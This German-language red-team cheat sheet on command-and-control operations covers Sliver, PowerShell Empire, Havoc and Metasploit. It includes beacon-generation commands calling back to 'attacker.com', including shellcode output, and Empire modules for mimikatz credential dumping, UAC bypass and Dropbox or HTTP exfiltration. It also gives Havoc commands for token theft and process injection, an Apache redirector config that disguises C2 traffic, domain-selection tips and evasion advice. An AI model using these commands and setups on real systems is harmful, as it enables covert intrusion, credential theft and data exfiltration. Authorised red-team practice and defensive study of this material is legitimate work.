# C2 Operations (Command & Control)

> Command & Control-Infrastruktur ist das Rückgrat jeder Red Team Operation – sie ermöglicht persistente Kontrolle, Lateral Movement und Daten-Exfiltration nach dem initialen Zugriff.

## Inhalt

* [C2-Framework-Übersicht](#c2-framework-übersicht)
* [Sliver C2](#sliver-c2)
* [PowerShell Empire](#powershell-empire)
* [Havoc Framework](#havoc-framework)
* [Metasploit als C2](#metasploit-als-c2)
* [C2-Infrastruktur & OPSEC](#c2-infrastruktur--opsec)
* [Erkennungs-Indikatoren (IOCs)](#erkennungs-indikatoren-iocs)
* [Persistenz-Techniken](#persistenz-techniken)

---

## C2-Framework-Übersicht

| Framework | Sprache | Protokolle | Evasion | Lizenz | Beste Einsatz |
|-----------|---------|------------|---------|--------|---------------|
| **Sliver** | Go | mTLS, HTTP/S, DNS, WireGuard | Mittel-Hoch | Open Source | Professionelle Red Teams |
| **Empire** | Python/PS | HTTP/S, SMB, OneDrive | Mittel | Open Source | Windows/AD-Umgebungen |
| **Havoc** | C/C++ | HTTP/S, SMB, TCP | Sehr hoch | Open Source | EDR-geschützte Ziele |
| **Metasploit** | Ruby | TCP, HTTP/S | Niedrig | Open Source | Labs, schnelle Tests |
| **Cobalt Strike** | Java | Malleable HTTP/S, DNS | Sehr hoch | Kommerziell | Enterprise Red Teams |

---

## Sliver C2

### Architektur
```
[Sliver Server] <-- (mTLS/HTTPS/DNS/WireGuard) --> [Implantate auf Zielen]
      |
[Sliver Client] (Operator-Verbindung via mTLS)
```

### Implantate-Typen

**Beacon** (asynchron – empfohlen für Stealth):
- Verbindet sich in konfigurierbaren Intervallen mit Server
- Sleep-Jitter reduziert Erkennung durch Netzwerk-Monitoring
- Geringer Netzwerk-Traffic

**Session** (interaktiv – für aktive Operationen):
- Persistente Verbindung zum Server
- Sofortige Befehlsausführung
- Höheres Erkennungsrisiko durch kontinuierlichen Traffic

### Protokoll-Auswahl

| Protokoll | Port | Vorteile | Nachteile |
|-----------|------|----------|-----------|
| **mTLS** | 8888 | Verschlüsselt, authentifiziert | Auffällig auf Port 8888 |
| **HTTPS** | 443 | Standard-Port, weniger auffällig | TLS-Inspektion möglich |
| **DNS** | 53 | Durch fast jede Firewall | Langsam, auffällige DNS-Pattern |
| **WireGuard** | 51820 | Sehr schnell, verschlüsselt | Spezifisches Protokoll |
| **SMB** | 445 | Lateral Movement intern | Nur intern, nicht extern |

### Beacon-Generierung Best Practices

```bash
# Produktion: HTTPS mit Jitter und Kill-Date
generate beacon \
  --https attacker.com \
  --os windows \
  --arch amd64 \
  --sleep 60s \
  --jitter 20 \
  --kill-date 2024-12-31 \
  --format exe \
  --save /tmp/beacon_prod.exe

# Stealth: Kleinere Binary, kein Debug-Output
generate beacon \
  --https attacker.com:443 \
  --os windows --arch amd64 \
  --format shellcode \  # Shellcode für Injection
  --save /tmp/beacon.bin
```

### Wichtige Sliver-Befehle

```bash
# Infrastructure
https                     # HTTPS-Listener
mtls                      # mTLS-Listener
dns --domains c2.dom.com  # DNS-Listener
jobs                      # Aktive Listener

# Implantate
implants                  # Alle generierten Implantate
beacons                   # Aktive Beacons
sessions                  # Aktive Sessions
use <id>                  # Beacon/Session aktivieren

# Auf aktivem Beacon/Session
info                      # Ziel-Informationen
whoami                    # Aktueller Benutzer
ps                        # Prozesse
ls /path                  # Verzeichnis-Listing
download /remote /local   # Datei herunterladen
upload /local /remote     # Datei hochladen
execute-assembly /path/to.exe [args]  # .NET Assembly ausführen
socks5 start -P 1080      # SOCKS5-Proxy
portfwd add -r target:80  # Port-Forward
```

---

## PowerShell Empire

### Architektur
```
[Empire Server] <--> [REST API :1337] <--> [Starkiller Web-UI]
      |
[Listener] --> [Stager] --> [Agent auf Ziel]
```

### Listener-Typen

| Typ | Transport | Geeignet für |
|-----|-----------|-------------|
| **http** | HTTP | Interne Netzwerke |
| **https** | HTTPS | Externe Ziele |
| **http_com** | HTTP via COM | OPSEC-sensitiv |
| **smb** | SMB Named Pipe | Lateral Movement |
| **onedrive** | OneDrive API | Hohe Stealth |
| **dropbox** | Dropbox API | Cloud-Exfiltration |

### Wichtige Empire-Module

```
# Credential Harvesting
credentials/mimikatz/logonpasswords
credentials/mimikatz/lsadump
credentials/tokens

# Lateral Movement
lateral_movement/invoke_psexec
lateral_movement/invoke_wmi
lateral_movement/invoke_smbexec
lateral_movement/new_gpo_immediate_task

# Privilege Escalation
privesc/bypassuac_fodhelper
privesc/bypassuac_sdclt
privesc/getsystem

# Persistence
persistence/userland/registry
persistence/elevated/registry
persistence/elevated/wmi
persistence/elevated/schtask

# Exfiltration
exfiltration/dropbox_upload
exfiltration/http_exfil
```

---

## Havoc Framework

### Besondere Features
- **Sleep Obfuscation**: Beacon-Code wird im Sleep-Zustand im Memory verschlüsselt (EKKO/Zim)
- **Indirect Syscalls**: Umgeht EDR-Hooks durch direkte Syscall-Nummern
- **Hardware Breakpoints**: Anti-Hook-Technik gegen EDR-User-Mode-Hooking
- **BOF Support**: Beacon Object Files ohne Disk-Schreiben

### Demon-Befehle (Sliver-ähnlich)

```
shell <cmd>                          # Shell-Befehl
upload / download                    # Datei-Transfer
token steal <pid>                    # Token aus Prozess
token impersonate <username>         # User impersonieren
inject <pid> <shellcode_file>        # Process Injection
jump psexec <target> <svc>           # PsExec Lateral Movement
pivot smb <target>                   # SMB Pivot
socks <port>                         # SOCKS-Proxy
dotnet inline-execute <assembly>     # .NET In-Memory
bof <path> [args]                    # BOF ausführen
```

---

## C2-Infrastruktur & OPSEC

### Empfohlene Infrastruktur

```
Internet
    |
[CDN/CloudFlare]  <- Domain Fronting Tarnung
    |
[Redirector VPS]  <- Apache/Nginx Reverse Proxy
    |
[C2-Server VPS]   <- Sliver/Havoc Server (nicht direkt erreichbar)
    |
[Ziel-Netzwerk]   <- Beacon-Verbindung
```

### Redirector (Apache)

```apache
# /etc/apache2/sites-enabled/redirector.conf
<VirtualHost *:443>
    SSLEngine on
    SSLCertificateFile /etc/letsencrypt/live/legit-domain.com/fullchain.pem
    SSLCertificateKeyFile /etc/letsencrypt/live/legit-domain.com/privkey.pem

    # Nur legitime Beacon-Requests weiterleiten
    ProxyRequests Off
    ProxyPreserveHost On

    # C2-Traffic-Pattern weiterleiten
    RewriteEngine On
    RewriteCond %{REQUEST_URI} ^/api/v1/update
    RewriteRule ^(.*)$ https://c2-backend:8443$1 [P,L]

    # Alle anderen Requests: normale Website
    DocumentRoot /var/www/html
</VirtualHost>
```

### Domain-Auswahl für C2

- **Domain-Alter**: Ältere Domains (>1 Jahr) weniger verdächtig
- **Kategorie**: "Business Software", "Technology" – nicht Sicherheits-relevante Kategorien
- **SSL**: Immer TLS mit gültigem Zertifikat (Let's Encrypt)
- **Lookback**: Domain sollte keine Malware-History haben (prüfen via VirusTotal)

---

## Erkennungs-Indikatoren (IOCs)

### Sliver IOCs

| Indikator | Typ | Wert |
|-----------|-----|------|
| Default mTLS Port | Netzwerk | 31337 (ändern!) |
| Default HTTPS Port | Netzwerk | 443 |
| User-Agent | HTTP-Header | Go-http-client (ändern!) |
| Beacon-Größe | Datei | ~6-8 MB (Go-Binary) |
| Sleep-Calls | Memory | Timer-basierte Patterns |

### Empire IOCs

| Indikator | Typ | Wert |
|-----------|-----|------|
| Default Port | Netzwerk | 1337 (API), 80/443 (HTTP) |
| PS-Stager | PowerShell | Charakteristische Strings |
| User-Agent | HTTP-Header | Empire-spezifisch |

### Generische C2-Erkennung

- **Beaconing-Pattern**: Regelmäßige DNS/HTTP-Anfragen in gleichen Intervallen
- **Beacon-Jitter**: Randomisierung reduziert Erkennung → immer `--jitter` setzen
- **Beacon-Sleep**: Längere Intervalle (5-60min) bei Stealth-Operationen
- **Traffic-Volumen**: Niedrig halten – nur Befehle und Ergebnisse

---

## Persistenz-Techniken

### Windows (nach Privilege-Level sortiert)

| Technik | Rechte | Persistenz | Stealth |
|---------|--------|------------|---------|
| Registry Run-Key (HKCU) | User | Mittel | Mittel |
| Registry Run-Key (HKLM) | Admin | Hoch | Mittel |
| Scheduled Task | User/Admin | Hoch | Mittel |
| Service | SYSTEM | Sehr hoch | Niedrig |
| WMI Event | Admin | Sehr hoch | Hoch |
| COM Hijacking | User | Hoch | Hoch |
| DLL Sideloading | User | Hoch | Sehr hoch |
| BITS Job | User | Mittel | Hoch |
| Startup-Ordner | User/Admin | Mittel | Niedrig |

### Linux (nach Stealth sortiert)

| Technik | Rechte | Persistenz | Stealth |
|---------|--------|------------|---------|
| Cron Job | User/Root | Hoch | Mittel |
| Systemd Service | Root | Sehr hoch | Niedrig |
| SSH Authorized Keys | User | Sehr hoch | Hoch |
| ~/.bashrc / ~/.profile | User | Niedrig | Niedrig |
| LD_PRELOAD | Root | Sehr hoch | Hoch |
| /etc/init.d | Root | Hoch | Niedrig |
| Kernel Module | Root | Sehr hoch | Sehr hoch |

---

## Referenzen

- Sliver Framework: https://github.com/BishopFox/sliver
- PowerShell Empire: https://github.com/BC-SECURITY/Empire
- Havoc Framework: https://github.com/HavocFramework/Havoc
- MITRE ATT&CK C2: https://attack.mitre.org/tactics/TA0011/
- Red Team Development: https://redteam.guide/
